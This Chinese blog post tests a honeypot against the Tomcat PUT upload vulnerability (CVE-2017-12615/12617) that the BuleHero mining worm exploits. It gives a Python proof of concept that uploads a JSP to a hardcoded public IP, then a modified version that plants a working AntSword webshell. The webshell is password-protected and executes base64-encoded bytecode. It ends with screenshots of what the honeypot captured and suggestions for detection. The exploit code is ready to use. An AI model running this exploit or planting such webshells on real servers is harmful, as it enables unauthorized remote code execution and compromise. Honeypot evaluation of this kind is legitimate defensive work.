---
title: "Apache Tomcat远程代码执行漏洞"
description: "Apache Tomcat远程代码执行漏洞"
tags: ["Vulhub"]
ShowReadingTime: true
ShowShareButtons: false
ShowPostNavLinks: true
ShowBreadCrumbs: true
ShowCodeCopyButtons: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
disableSpecial1stPost: false
disableScrollToTop: false
comments: false
hidemeta: false
hideSummary: false
showtoc: true
tocopen: true
---
- 唐榕 - 2022-09-13 15:58

# 一、事件概述

腾讯安全御见威胁情报中心于2019年11月11日检测到挖矿蠕虫病毒BuleHero升级到4.0版。在此次更新中，BuleHero引入了多种新漏洞的使用，包括Tomcat任意文件上传漏洞(CVE-2017-12617)、Apache Struts2远程代码执行漏洞、Weblogic反序列化任意代码执行漏洞，此次又引入了Drupal远程代码执行漏洞、Apache Solr 远程命令执行漏洞、PHPStudy后门利用，使得其攻击方法增加到十个之多。(报告链接:[https://www.freebuf.com/news/219973.html](https://www.freebuf.com/news/219973.html))

# 二、POC获取及复现

## 1、POC获取

```python
import requests
targeturl = "http://8.210.158.131:8080/test.jsp"
payload = '<% out.println("hello world!"); %>'
requests.put(targeturl+'/',data=payload)
r = requests.get(targeturl)
if r.status_code==200:
    if(r.text.find('hello world!')!=-1):
        print('存在CVE-2017-12615 Tomcat 任意文件读写漏洞')
        exit()
print('不存在CVE-2017-12615 Tomcat 任意文件读写漏洞')
```

## 2、根据真实攻击修改POC

### 2.1、样本漏洞利用分析

样本(ecb3266326d77741815ecebb18ee951a)使用了两种后缀名绕过的方法将木马文件`FxCodeShell.jsp`进行上传。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId5.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId5.png)

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId6.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId6.png)

其中文件部分内容如下：

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId7.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId7.png)

### 2.2、修改POC

将payload内容改为蚁剑jsp的一句木马，并设置连接密码为passwd。

```python
import requests
targeturl = "http://8.210.158.131:8080/test.jsp"
payload='''
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
'''
requests.put(targeturl+'/',data=payload)
r = requests.get(targeturl)
if r.status_code==200:
    #if(r.text.find('hello world!')!=-1):
    print('存在CVE-2017-12615 Tomcat 任意文件读写漏洞')
    exit()
print('不存在CVE-2017-12615 Tomcat 任意文件读写漏洞')
```

## 3、在蜜罐中复现过程

本次复现使用的蜜罐地址为：[https://47.115.125.75/](https://47.115.125.75/)。首先启动对应的蜜罐服务。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId9.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId9.png)

地址栏输入IP和对应端口后访问正常。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId10.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId10.png)

将修改的POC执行。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId11.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId11.png)

成功执行命令后进入蜜罐查看威胁事件，蜜罐能够成功捕获到漏洞利用行为和漏洞类型。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId12.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId12.png)

通过漏洞利用写入的样本文件也能被捕获到。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId13.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId13.png)

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId14.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId14.png)

捕获到的流量也完整。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId15.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId15.png)

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId16.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId16.png)

日志同样捕获到漏洞利用痕迹，但未能准确报出威胁类型。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId17.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId17.png)

在使用蚁剑连接时，密网也能捕获到消息的威胁事件信息。

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId18.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId18.png)

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId19.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId19.png)

![/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId20.png](/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId20.png)

# 三、复现结果及建议

复现结果：对于Apache Tomcat远代码执行漏洞的利用，蜜罐能够准确的捕获到威胁事件并且提供较为详细的数据视图，其中包括漏洞类型、Pcap包、远程执行的payload、落地文件、网络日志，但在网络日志中缺失对威胁判断的数据，即没能研判黑白。

优化建议：对网络日志中的威胁判断一栏进行加强检测，可以将收集一些恶意的payload与网络流量碰撞进行研判。